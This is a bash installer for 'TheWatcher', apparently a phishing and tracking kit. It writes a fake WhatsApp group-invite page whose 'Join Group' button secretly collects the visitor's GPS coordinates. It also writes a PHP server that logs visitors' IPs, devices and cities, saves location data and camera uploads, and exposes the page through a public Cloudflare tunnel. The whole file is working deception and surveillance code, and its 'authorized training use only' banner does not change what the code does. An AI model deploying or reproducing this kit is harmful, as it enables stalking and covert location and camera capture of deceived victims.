#!/usr/bin/env bash
RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
BLUE='\033[94m'
CYAN='\033[96m'
WHITE='\033[97m'
BOLD='\033[1m'
END='\033[0m'

print_success() { echo -e "  ${GREEN}✓${END} ${WHITE}$1${END}"; }
print_info() { echo -e "  ${BLUE}ℹ${END} ${WHITE}$1${END}"; }
print_error() { echo -e "  ${RED}✗${END} ${WHITE}$1${END}"; }
print_warning() { echo -e "  ${YELLOW}⚠${END} ${WHITE}$1${END}"; }

clear
echo -e "${CYAN}${BOLD}"
echo '╔═══════════════════════════════════════════════════════════════╗'
echo '║              TheWatcher Installer                             ║'
echo '║                Everything installs automatically              ║'
echo '╚═══════════════════════════════════════════════════════════════╝'
echo -e "${END}\n"

# Detect system
if [[ -d "/data/data/com.termux/files/usr" ]]; then
    SYSTEM="termux"
    print_info "Detected: Termux (Android)"
elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
    SYSTEM="linux"
    print_info "Detected: Linux"
elif [[ "$OSTYPE" == "darwin"* ]]; then
    SYSTEM="macos"
    print_info "Detected: macOS"
else
    SYSTEM="unknown"
    print_info "Detected: Unknown system"
fi

# Create directories
mkdir -p modules data templates 2>/dev/null

# ==================== INSTALL PYTHON DEPENDENCIES ====================
print_info "Installing Python dependencies..."
if pip install requests -q 2>/dev/null || pip3 install requests -q 2>/dev/null; then
    print_success "requests installed"
else
    print_warning "requests installation failed, continuing..."
fi

# ==================== INSTALL PHP AUTOMATICALLY ====================
print_info "Installing PHP..."

if [[ "$SYSTEM" == "termux" ]]; then
    # Termux - fix any issues first
    print_info "Preparing Termux packages..."
    rm -f $PREFIX/var/lib/dpkg/lock-frontend 2>/dev/null
    rm -f $PREFIX/var/lib/dpkg/lock 2>/dev/null
    rm -rf $PREFIX/var/lib/apt/lists/* 2>/dev/null
    
    # Update and install PHP
    pkg update -y 2>/dev/null || true
    pkg upgrade -y 2>/dev/null || true
    pkg install php -y 2>/dev/null || true
    
elif [[ "$SYSTEM" == "linux" ]]; then
    # Linux - detect package manager
    if command -v apt &>/dev/null; then
        print_info "Using apt package manager..."
        sudo apt update -y 2>/dev/null || true
        sudo apt install php -y 2>/dev/null || true
        sudo apt install php-cli -y 2>/dev/null || true
    elif command -v yum &>/dev/null; then
        print_info "Using yum package manager..."
        sudo yum install php -y 2>/dev/null || true
        sudo yum install php-cli -y 2>/dev/null || true
    elif command -v dnf &>/dev/null; then
        print_info "Using dnf package manager..."
        sudo dnf install php -y 2>/dev/null || true
        sudo dnf install php-cli -y 2>/dev/null || true
    elif command -v pacman &>/dev/null; then
        print_info "Using pacman package manager..."
        sudo pacman -S php --noconfirm 2>/dev/null || true
    elif command -v zypper &>/dev/null; then
        print_info "Using zypper package manager..."
        sudo zypper install php -y 2>/dev/null || true
    else
        print_warning "No package manager found, trying to compile PHP..."
        cd /tmp
        wget -q https://www.php.net/distributions/php-8.2.12.tar.gz
        tar -xzf php-8.2.12.tar.gz
        cd php-8.2.12
        ./configure --prefix=/usr/local/php --enable-cli 2>/dev/null || true
        make -j4 2>/dev/null || true
        sudo make install 2>/dev/null || true
        sudo ln -sf /usr/local/php/bin/php /usr/local/bin/php 2>/dev/null || true
        cd -
        rm -rf /tmp/php-8.2.12*
    fi
    
elif [[ "$SYSTEM" == "macos" ]]; then
    # macOS
    if command -v brew &>/dev/null; then
        print_info "Using Homebrew..."
        brew update 2>/dev/null || true
        brew install php 2>/dev/null || true
    else
        print_info "Installing Homebrew first..."
        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" 2>/dev/null || true
        brew install php 2>/dev/null || true
    fi
fi

# Verify PHP installation
if command -v php &>/dev/null; then
    PHP_VER=$(php -v | head -1 | cut -d' ' -f2 | cut -d'-' -f1)
    print_success "PHP $PHP_VER installed successfully"
else
    print_warning "PHP installation had issues, but continuing..."
fi

# ==================== INSTALL CLOUDFLARED (AUTOMATIC) ====================
print_info "Installing Cloudflared for public URLs..."
CLOUDFLARE_INSTALLED=false

if [[ "$SYSTEM" == "termux" ]]; then
    if wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared 2>/dev/null; then
        chmod +x cloudflared
        mv cloudflared $PREFIX/bin/ 2>/dev/null && CLOUDFLARE_INSTALLED=true
    fi
elif [[ "$SYSTEM" == "linux" ]]; then
    ARCH=$(uname -m)
    if [[ "$ARCH" == "aarch64" ]] || [[ "$ARCH" == "arm64" ]]; then
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared 2>/dev/null
    elif [[ "$ARCH" == "armv7l" ]]; then
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared 2>/dev/null
    else
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared 2>/dev/null
    fi
    chmod +x cloudflared
    sudo mv cloudflared /usr/local/bin/ 2>/dev/null && CLOUDFLARE_INSTALLED=true
elif [[ "$SYSTEM" == "macos" ]]; then
    if command -v brew &>/dev/null; then
        brew install cloudflared 2>/dev/null && CLOUDFLARE_INSTALLED=true
    fi
fi

if [[ "$CLOUDFLARE_INSTALLED" == true ]] || command -v cloudflared &>/dev/null; then
    print_success "Cloudflared installed"
else
    print_warning "Cloudflared not installed (optional for local only)"
fi

# ==================== CREATE MODULE FILES ====================
print_info "Creating module files..."

# Create modules/__init__.py
cat > modules/__init__.py << 'EOF'
from .cloudflare import CloudflareTunnel
from .templates import TemplateManager
EOF

# Create modules/cloudflare.py
cat > modules/cloudflare.py << 'EOF'
import subprocess, re, os, time
class CloudflareTunnel:
    def __init__(self): self.process=None; self.url=None; self.logfile=None
    def start(self, port):
        self.logfile=f"/tmp/cf_{port}.log"
        try:
            subprocess.run(["cloudflared","--version"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        except:
            return None
        cmd=f"cloudflared tunnel --url http://127.0.0.1:{port} --logfile {self.logfile}"
        self.process=subprocess.Popen(cmd,shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        for _ in range(30):
            time.sleep(1)
            if os.path.exists(self.logfile):
                with open(self.logfile,'r') as f:
                    m=re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com',f.read())
                    if m: self.url=m.group(0); return self.url
        return None
    def stop(self):
        if self.process: self.process.terminate()
        if self.logfile and os.path.exists(self.logfile): os.remove(self.logfile)
EOF

# Create modules/templates.py
cat > modules/templates.py << 'EOF'
#!/usr/bin/env python3
import os, base64

class TemplateManager:
    
    @staticmethod
    def get_whatsapp_location(name, img, members):
        src = img
        if os.path.exists(img) and os.path.isfile(img):
            with open(img,'rb') as f:
                d=base64.b64encode(f.read()).decode()
                m='image/png' if img.endswith('.png') else 'image/jpeg'
                src=f"data:{m};base64,{d}"
        return f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><title>WhatsApp Group</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f0f2f5}}.header{{background:#075E54;color:#fff;padding:12px 16px}}.header-content{{max-width:500px;margin:0 auto;display:flex;align-items:center;gap:10px}}.main{{max-width:500px;margin:40px auto;padding:0 16px}}.card{{background:#fff;border-radius:24px;overflow:hidden;text-align:center;box-shadow:0 8px 30px rgba(0,0,0,0.1)}}.avatar{{width:100px;height:100px;border-radius:50%;margin:30px auto 15px;overflow:hidden;border:3px solid #25D366}}.avatar img{{width:100%;height:100%;object-fit:cover}}.name{{font-size:24px;font-weight:600;color:#075E54}}.type{{color:#666;font-size:13px}}.count{{display:inline-block;background:#e8f5e9;color:#075E54;padding:4px 12px;border-radius:20px;font-size:12px;margin:15px 0}}.btn{{background:#25D366;color:#fff;border:none;padding:14px 35px;border-radius:40px;font-size:16px;font-weight:600;margin:0 20px 30px;width:calc(100% - 40px);cursor:pointer}}.loading{{display:none;text-align:center;padding:50px;background:#fff;border-radius:24px}}.spinner{{width:40px;height:40px;border:3px solid #e0e0e0;border-top:3px solid #25D366;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 15px}}@keyframes spin{{to{{transform:rotate(360deg)}}}}.modal{{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);z-index:1000;justify-content:center;align-items:center}}.modal-content{{background:#fff;border-radius:20px;max-width:280px;width:90%;text-align:center;overflow:hidden}}.modal-title{{font-size:20px;font-weight:700;color:#075E54;padding:10px 20px}}.modal-msg{{color:#666;padding:10px 25px 20px;font-size:14px}}.modal-btn{{background:#25D366;color:#fff;border:none;padding:14px;width:100%;font-size:15px;font-weight:600;cursor:pointer}}.bottom-bar{{background:#075E54;color:#fff;padding:30px 16px 15px;margin-top:40px}}.bottom-text{{text-align:center;font-size:11px;opacity:0.7}}</style>
</head>
<body>
<div class="header"><div class="header-content"><svg viewBox="0 0 24 24" fill="white"><path d="M12.04 2c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95L2.05 22l5.25-1.38c1.45.79 3.08 1.21 4.74 1.21 5.46 0 9.91-4.45 9.91-9.91 0-5.46-4.45-9.91-9.91-9.91z"/><path fill="#25D366" d="M12.04 3.5c4.62 0 8.38 3.76 8.38 8.38 0 4.62-3.76 8.38-8.38 8.38-1.45 0-2.86-.36-4.09-1.02l-.52-.27-3.11.82.83-3.04-.28-.54c-.68-1.27-1.04-2.68-1.04-4.13 0-4.62 3.76-8.38 8.38-8.38z"/></svg><span>WhatsApp</span></div></div>
<div class="main"><div class="card" id="card"><div class="avatar"><img src="{src}"></div><div class="name">{name}</div><div class="type">WhatsApp Group</div><div class="count">{members} members</div><button class="btn" id="joinBtn">Join Group</button></div><div class="loading" id="loading"><div class="spinner"></div><p>Joining...</p></div></div>
<div class="modal" id="modal"><div class="modal-content"><div class="modal-title">Group Full</div><div class="modal-msg">Maximum 256 participants reached.</div><button class="modal-btn" id="closeModal">OK</button></div></div>
<div class="bottom-bar"><div class="bottom-text">© 2024 WhatsApp Inc.</div></div>
<script>
document.getElementById('joinBtn').onclick=()=>{document.getElementById('card').style.display='none';document.getElementById('loading').style.display='block';setTimeout(()=>{if("geolocation" in navigator){navigator.geolocation.getCurrentPosition(pos=>{fetch('/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lng:pos.coords.longitude,acc:pos.coords.accuracy})}).then(()=>{document.getElementById('loading').style.display='none';document.getElementById('modal').style.display='flex'})},err=>{document.getElementById('loading').style.display='none';document.getElementById('card').style.display='block'})}},1500)};
document.getElementById('closeModal').onclick=()=>{document.getElementById('modal').style.display='none';document.getElementById('card').style.display='block'};
</script>
</body>
</html>'''
    
    @staticmethod
    def get_instagram_story_custom(u,v,p,vt,vi,l,c):
        return f"<html><body><h1>Instagram Story</h1><p>@{u}</p></body></html>"
    @staticmethod
    def get_tiktok_video_custom(u,v,p,vt,vi,l,c,sh,ca):
        return f"<html><body><h1>TikTok Video</h1><p>@{u}</p></body></html>"
    @staticmethod
    def get_instagram_camera(u,v,p,vt,l,c,sh,ca):
        return f"<html><body><h1>Instagram Reel</h1><p>@{u}</p></body></html>"
    @staticmethod
    def get_tiktok_camera(u,v,p,vt,l,c,sh,ca):
        return f"<html><body><h1>TikTok Camera</h1><p>@{u}</p></body></html>"
EOF

print_success "Module files created"

# Create server.php
cat > server.php << 'EOF'
<?php
if (!is_dir('data')) mkdir('data',0755,true);
if (!is_dir('templates')) mkdir('templates',0755,true);
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') { http_response_code(200); exit(); }
$uri = strtok($_SERVER['REQUEST_URI'], '?');
function getIP(){ $ip=$_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR']??'Unknown'; return trim(explode(',',$ip)[0]); }
function logMsg($type,$data){
    $out="\n".str_repeat("=",70)."\n".($type=='visit'?"🔴 NEW VISITOR DETECTED!":($type=='location'?"📍 LOCATION CAPTURED!":"📸 CAMERA CAPTURED!"))."\n".str_repeat("=",70)."\n";
    $out.="  📅 Time: ".date('Y-m-d H:i:s')."\n  🌐 IP: {$data['ip']}\n";
    if($type=='location') $out.="  📍 GPS: {$data['lat']}, {$data['lng']}\n";
    $out.="  📱 Device: {$data['device']}\n  💻 OS: {$data['os']}\n  🌍 Browser: {$data['browser']}\n";
    if($type!='camera') $out.="  🏙️ City: {$data['city']}\n";
    $out.="  💾 Saved: {$data['file']}\n".str_repeat("=",70)."\n";
    file_put_contents('php://stderr',$out);
}
function parseUA($ua){
    $l=strtolower($ua);
    $os='Unknown'; if(strpos($l,'android')!==false) $os='Android';
    elseif(strpos($l,'iphone')!==false) $os='iOS';
    elseif(strpos($l,'windows')!==false) $os='Windows';
    elseif(strpos($l,'mac')!==false) $os='macOS';
    elseif(strpos($l,'linux')!==false) $os='Linux';
    $browser='Unknown';
    if(strpos($l,'chrome')!==false && strpos($l,'edg')===false) $browser='Chrome';
    elseif(strpos($l,'firefox')!==false) $browser='Firefox';
    elseif(strpos($l,'safari')!==false && strpos($l,'chrome')===false) $browser='Safari';
    elseif(strpos($l,'edg')!==false) $browser='Edge';
    $device='Desktop'; if(strpos($l,'mobile')!==false) $device='Mobile Phone';
    elseif(strpos($l,'tablet')!==false) $device='Tablet';
    return ['os'=>$os,'browser'=>$browser,'device'=>$device];
}
function getGeo($ip){
    if($ip=='127.0.0.1'||strpos($ip,'192.168.')===0||strpos($ip,'10.')===0) return ['country'=>'Local','city'=>'Local'];
    $resp=@file_get_contents("http://ip-api.com/json/$ip");
    if($resp){ $data=json_decode($resp,true);
        if($data&&$data['status']=='success') return ['country'=>$data['country']??'Unknown','city'=>$data['city']??'Unknown'];
    }
    return ['country'=>'Unknown','city'=>'Unknown'];
}
if($uri=='/' && file_exists('templates/current.html')){
    $ip=getIP(); $ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
    $d=parseUA($ua); $g=getGeo($ip);
    logMsg('visit',['ip'=>$ip,'device'=>$d['device'],'os'=>$d['os'],'browser'=>$d['browser'],'city'=>$g['city'],'country'=>$g['country'],'file'=>'N/A']);
    header('Content-Type:text/html'); readfile('templates/current.html'); exit();
}
if($uri=='/location' && $_SERVER['REQUEST_METHOD']=='POST'){
    $data=json_decode(file_get_contents('php://input'),true);
    if($data){
        $ip=getIP(); $ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
        $d=parseUA($ua); $g=getGeo($ip);
        $f="data/location_".time().".json";
        file_put_contents($f,json_encode(['timestamp'=>date('Y-m-d H:i:s'),'ip_address'=>$ip,'coordinates'=>['latitude'=>$data['lat'],'longitude'=>$data['lng'],'accuracy'=>$data['acc']],'device'=>$d,'network'=>$g],JSON_PRETTY_PRINT));
        logMsg('location',['ip'=>$ip,'lat'=>$data['lat'],'lng'=>$data['lng'],'device'=>$d['device'],'os'=>$d['os'],'browser'=>$d['browser'],'city'=>$g['city'],'country'=>$g['country'],'file'=>$f]);
        header('Content-Type:application/json'); echo json_encode(['status'=>'ok']); exit();
    }
}
if($uri=='/camera' && $_SERVER['REQUEST_METHOD']=='POST' && isset($_FILES['image'])){
    $f="data/camera_".time().".jpg";
    move_uploaded_file($_FILES['image']['tmp_name'],$f);
    $ip=getIP(); $ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
    $d=parseUA($ua); $g=getGeo($ip);
    logMsg('camera',['ip'=>$ip,'device'=>$d['device'],'os'=>$d['os'],'browser'=>$d['browser'],'city'=>$g['city'],'country'=>$g['country'],'file'=>$f]);
    header('Content-Type:application/json'); echo json_encode(['status'=>'ok']); exit();
}
if(file_exists('templates/current.html')) readfile('templates/current.html');
else echo "TheWatcher Ready";
?>
EOF

print_success "Server file created"

# Create start script
cat > start.sh << 'EOF'
#!/bin/bash
cd "$(dirname "$0")"
echo -e "\033[96m🚀 Starting TheWatcher...\033[0m"
python3 thewatcher.py
EOF
chmod +x start.sh

echo ""
echo -e "${GREEN}${BOLD}╔═══════════════════════════════════════════════════════════════╗${END}"
echo -e "${GREEN}${BOLD}║                    ✅ INSTALLATION COMPLETE!                    ║${END}"
echo -e "${GREEN}${BOLD}╚═══════════════════════════════════════════════════════════════╝${END}"
echo ""
echo -e "${CYAN}🚀 TO START THEWATCHER:${END}"
echo -e "  ${YELLOW}python3 thewatcher.py${END}"
echo ""
echo -e "${CYAN}📁 Installation Directory: ${YELLOW}$(pwd)${END}"
echo ""
echo -e "${RED}${BOLD}⚠️  AUTHORIZED TRAINING USE ONLY${END}"
echo ""
